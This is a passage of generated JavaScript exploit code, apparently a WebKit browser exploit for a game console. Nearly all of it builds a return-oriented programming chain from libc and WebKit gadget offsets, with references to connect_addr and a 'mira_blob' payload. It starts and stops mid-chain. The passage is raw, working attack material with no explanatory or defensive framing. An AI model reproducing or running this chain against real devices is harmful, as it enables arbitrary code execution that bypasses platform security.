libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+185816, //L3004
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+185624, //L3005
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+185640, //L3006
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+185656, //L3007
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+185672, //L3008
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+185688, //L3009
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+185704, //L3010
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+185736, //L3011
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
connect_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+185728, //L3012
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+185784, //L3013
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+185800, //L3014
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L3005:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3006:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L3007:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3008:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3009:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L3010:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L3012:
db([0, 0]); // 0x0
//L3011:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+185768, //L3015
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L3015:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3013:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3014:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L3004:
db([0, 0]); // 0x0
//_main:
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+185872, //L3016-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L3016:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+185936, //L3018-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L3018:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294965192, 4294967295]); // -0x838
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092 //pop rax
]);
//L3020:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L3022:
ropchain+186096, //L3021
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+211864, //L3023
//L3021:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+186216, //L3025-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+186232, //L3026-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+186200, //L3024-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3024:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3025:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3026:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+186336, //L3028-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+186384, //L3031-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+186368, //L3030-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3028:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3029:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3030:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3031:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+362222, //pop rsi
ropchain+186512, //L3032+8
libc_base+499086, //add rax, rsi
libc_base+751703, //mov rax, [rax]
libc_base+362222, //pop rsi
ropchain+186488, //L3032-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+766440 //pop rsp
]);
//L3032:
db([0, 0]); // 0x0
set_gadgets([
ropchain+186528, //L3032+24
ropchain+186968, //L3027
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+186552, //L3033-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3033:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3034:
db([1, 0]); // 0x1
set_gadget(libc_base+155394,); //pop rdi
//L3035:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+186688, //L3036-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+186720, //L3038-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+186704, //L3037-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3036:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3037:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3038:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+186816, //L3039-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+186832, //L3040-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L3039:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3040:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+186944, //L3041-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+186928, //L3042-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L3042:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L3041:
db([0, 0]); // 0x0
//L3027:
set_gadgets([
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+187024, //L3043-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+187056, //L3045-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3043:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3044:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3045:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3046:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+187168, //L3048-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+187152, //L3047-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3047:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3048:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L3049:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L3050:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L3051:
db([1, 0]); // 0x1
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L3052:
db([2, 0]); // 0x2
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3053:
db([4096, 0]); // 0x1000
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+187480, //L3056-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3056:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+85173, //or rax, rcx
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L3057:
db([1, 0]); // 0x1
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3058:
db([2, 0]); // 0x2
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+187672, //L3061-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3061:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+85173, //or rax, rcx
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3062:
db([4, 0]); // 0x4
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+187816, //L3065-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3065:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+85173, //or rax, rcx
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+187928, //L3066-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3066:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3067:
db([131072, 0]); // 0x20000
set_gadget(libc_base+155394,); //pop rdi
//L3068:
db([131072, 0]); // 0x20000
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+188056, //L3070-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+188040, //L3069-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3069:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3070:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L3071:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L3073:
ropchain+188224, //L3072
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+210200, //L3074
//L3072:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+188296, //L3077-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3075:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L3077:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+7880191, //mov [rax], rcx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3078:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+757614, //pop rcx
//L3080:
(window.mira_blob||0),
libc_base+499086, //add rax, rsi
webkit_base+7880191, //mov [rax], rcx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3081:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+188496, //L3085-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+188480, //L3084-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3084:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3085:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+188664, //L3089-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+188696, //L3091-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+188632, //L3087-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+188648, //L3088-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3087:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3088:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L3089:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3090:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3091:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+362222, //pop rsi
ropchain+188824, //L3092+8
libc_base+499086, //add rax, rsi
libc_base+751703, //mov rax, [rax]
libc_base+362222, //pop rsi
ropchain+188800, //L3092-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+766440 //pop rsp
]);
//L3092:
db([0, 0]); // 0x0
set_gadgets([
ropchain+188840, //L3092+24
ropchain+195160, //L3086
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3093:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+757614,); //pop rcx
//L3095:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+188920, //L3097-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3096:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3097:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2935451, //mov [rax], ecx
libc_base+362222, //pop rsi
ropchain+188976, //L3100-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3100:
db([0, 0]); // 0x0
//L3098:
set_gadgets([
libc_base+362222, //pop rsi
ropchain+189040, //L3103-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3101:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+757614,); //pop rcx
//L3103:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+189144, //L3106-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+189128, //L3105-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3105:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3106:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+189312, //L3109-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+189328, //L3110-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+189280, //L3107-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+189296, //L3108-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3107:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3108:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3109:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3110:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+189400, //L3111-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+189416, //L3112-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3111:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3112:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+189512, //L3114-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+189496, //L3113-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L3113:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3114:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+189592, //L3115-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3115:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3116:
db([131072, 0]); // 0x20000
set_gadget(libc_base+155394,); //pop rdi
//L3117:
db([131072, 0]); // 0x20000
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+189728, //L3118-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+189760, //L3120-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+189744, //L3119-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3118:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3119:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3120:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+19066556, //cmp rax, rcx ; setb al
webkit_base+6790262, //setl al
libc_base+227029, //movzx eax, al
libc_base+362222, //pop rsi
ropchain+189928, //L3122-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+189944, //L3123-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+189912, //L3121-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3121:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3122:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3123:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+190048, //L3125-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+190096, //L3128-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+190080, //L3127-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L3125:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3126:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3127:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3128:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+362222, //pop rsi
ropchain+190224, //L3129+8
libc_base+499086, //add rax, rsi
libc_base+751703, //mov rax, [rax]
libc_base+362222, //pop rsi
ropchain+190200, //L3129-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+766440 //pop rsp
]);
//L3129:
db([0, 0]); // 0x0
set_gadgets([
ropchain+190240, //L3129+24
ropchain+190256, //L3124
libc_base+766440, //pop rsp
ropchain+190272, //L3130
//L3124:
libc_base+766440, //pop rsp
ropchain+195144, //L3131
//L3130:
libc_base+362222, //pop rsi
ropchain+190312, //L3134-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3132:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+757614,); //pop rcx
//L3134:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+190416, //L3137-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+190400, //L3136-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3136:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3137:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+190560, //L3140-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+190528, //L3138-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+190544, //L3139-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L3138:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3139:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L3140:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+190632, //L3141-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3141:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+190688, //L3144-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3144:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+190784, //L3147-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L3145:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+757614,); //pop rcx
//L3147:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+190888, //L3150-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+190872, //L3149-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L3149:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3150:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+191056, //L3153-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+191072, //L3154-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+191024, //L3151-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
